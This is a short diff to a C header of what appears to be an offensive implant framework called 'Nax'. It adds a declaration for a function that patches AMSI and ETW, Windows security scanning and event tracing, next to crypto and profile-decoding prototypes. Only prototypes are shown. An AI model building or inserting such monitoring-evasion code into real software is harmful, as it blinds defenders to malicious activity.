@@ -65,6 +65,10 @@ FUNC INT NaxDecodeProfile( const PBYTE data, UINT32 data_len, PNAX_INSTANCE Nax 
 FUNC VOID NaxCfgInit( PNAX_INSTANCE Nax );
 FUNC BOOL NaxCfgAddTarget( PNAX_INSTANCE Nax, PVOID ImageBase, PVOID Function );
 
+/* ========= [ Core/Patch.c - P3 AMSI/ETW patches (lane-gated) ] ========= */
+
+FUNC UINT32 NaxEtwAmsiPatch( PNAX_INSTANCE Nax );
+
 /* ========= [ Core/Crypto.c ] ========= */
 
 FUNC INT NaxEncrypt( PNAX_INSTANCE Nax, const PBYTE plain, UINT32 plain_len, PBYTE out, UINT32* out_len );
